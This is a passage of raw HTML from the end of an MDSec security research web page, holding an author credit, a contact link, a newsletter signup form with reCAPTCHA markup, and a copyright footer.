+					<img alt="" src="https://secure.gravatar.com/avatar/9cb7b62409a4b5ef00769dca4ba852fc49229c9729d600fc2637daf77068c31c?s=96&amp;d=wp_user_avatar&amp;r=g" class="avatar avatar-96 photo" height="96" width="96" loading="lazy" decoding="async">				</div>
+				<div class="author-meta">
+					<div class="author-meta__content">
+						<span>written by</span>
+						<h4>MDSec Research</h4>
+					</div>
+				</div>
+			</div>
+		</div>
+		<section class="testing">
+	<div class="content-wrapper">
+		<h2>Ready to engage<br>with MDSec?</h2>
+		<div class="button">
+			<a href="https://www.mdsec.co.uk/contact">
+				Get in touch
+			</a>
+		</div>
+	</div>
+</section>		
+	</section>
+
+
+
+
+	<section class="newsletter">
+	<div class="content-wrapper clearfix">
+		<div class="newsletter-left">
+			<p>
+				Stay updated with the latest <br>news from MDSec.
+			</p>
+		</div>
+		<div class="newsletter-right">
+			<div class="frm_forms  with_frm_style frm_style_formidable-style" id="frm_form_2_container">
+<form enctype="multipart/form-data" method="post" class="frm-show-form  frm_js_validate " id="form_newslettersignupform">
+<div class="frm_form_fields ">
+<fieldset>
+<legend class="frm_screen_reader">Newsletter Signup Form</legend>
+
+<div class="frm_fields_container">
+
+
+
+
+
+<div id="frm_field_10_container" class="frm_form_field form-field  frm_none_container frm_full">
+    <label for="field_nkjbj" id="field_nkjbj_label" class="frm_primary_label">Email
+        <span class="frm_required"></span>
+    </label>
+    <input type="email" id="field_nkjbj" name="item_meta[10]" value="" placeholder="Enter your email for updates" data-invmsg="Email is invalid" aria-invalid="false">
+    
+    
+</div>
+<div id="frm_field_11_container" class="frm_form_field form-field  frm_none_container frm_first frm_full">
+    <label for="g-recaptcha-response" id="field_ah4d8_label" class="frm_primary_label" style="display: none;">
+        <span class="frm_required"></span>
+    </label>
+    <div id="field_ah4d8" class="frm-g-recaptcha" data-sitekey="6Lc27L0ZAAAAAMV4QCtKwWRbT-Hm1FnY6IKqcSxw" data-size="invisible" data-theme="light" data-rid="0"><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><div title="reCAPTCHA" width="256" height="60" role="presentation" name="a-98zqyqnbtex0" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Lc27L0ZAAAAAMV4QCtKwWRbT-Hm1FnY6IKqcSxw&amp;co=aHR0cHM6Ly93d3cubWRzZWMuY28udWs6NDQz&amp;hl=en&amp;v=zFuF-tbndD6YrdyXHX3EVT0n&amp;theme=light&amp;size=invisible&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=z37mo2hrhcb8" data-original-tag="iframe">
+
+<title>reCAPTCHA</title>
+
+<link rel="stylesheet" type="text/css" href="https://www.gstatic.com/recaptcha/releases/zFuF-tbndD6YrdyXHX3EVT0n/styles__ltr.css">
+
+
+<div id="rc-anchor-alert" class="rc-anchor-alert"></div>
+
+<div class="rc-anchor rc-anchor-invisible rc-anchor-light  rc-anchor-invisible-hover"><div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Recaptcha requires verification. </div><div class="rc-anchor-error-msg-container" style="display:none"><span class="rc-anchor-error-msg" aria-hidden="true"></span></div><div class="rc-anchor-normal-footer"><div class="rc-anchor-logo-large" role="presentation"><div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div></div><div class="rc-anchor-pt"></div></div><div class="rc-anchor-invisible-text"><span>protected by <strong>reCAPTCHA</strong></span><div class="rc-anchor-pt"></div></div></div><div style="display: none;" data-original-tag="iframe"></div></div></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><div style="display: none;" data-original-tag="iframe"></div></div>
+    
+    
+</div>
+	
+			<div id="frm_field_29_container">
+			<label for="field_i68ou" style="display:none;">
+				If you are human, leave this field blank.			</label>
+			<input id="field_i68ou" type="text" class="frm_form_field form-field frm_verify" name="item_meta[29]" value="" style="display:none;">
+		</div>
+		<div class="frm_submit">
+
+<button class="frm_button_submit" type="submit">Submit</button>
+
+</div></div>
+</fieldset>
+</div>
+
+</form>
+</div>
+			
+		</div>
+	</div>
+</section>
+
+		</div>
+	<!-- Site Wrapper End -->
+	
+	<!-- Footer Start -->	
+	
+
+	<div class="end clearfix">
+		<div class="end__left">
+			Copyright 2026 MDSec
+		</div>
+		<div class="end__right">
+			<!--<a href="#">Privacy Policy</a>-->
+		</div>
+	</div>
+	<!-- Footer End -->
+	
+    
+
+
+
+
+
+
+
+
+
+
+	
+			
+	
+	
+
+
+
+    	    			
+
+
+
+
+<div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility linear 0.3s, opacity 0.3s linear; opacity: 0;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div><div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: fixed; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255);"><div title="recaptcha challenge expires in two minutes" name="c-98zqyqnbtex0" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=zFuF-tbndD6YrdyXHX3EVT0n&amp;k=6Lc27L0ZAAAAAMV4QCtKwWRbT-Hm1FnY6IKqcSxw&amp;bft=0dAFcWeA7Ft6ymefDLmqOmzx1aw35p0eJFDZSG0XimeBFmtOZf57d0Wy4dGjI0yNyLdZNmgzbr3pwa7OaNzuDMClfcG41qcwcelg" style="width: 100%; height: 100%;" data-original-tag="iframe">
+
+
+<title>reCAPTCHA</title>
+
+<link rel="stylesheet" type="text/css" href="https://www.gstatic.com/recaptcha/releases/zFuF-tbndD6YrdyXHX3EVT0n/styles__ltr.css">
+
+
+
+<div></div></div></div></div></body><!-- Body End --></html>
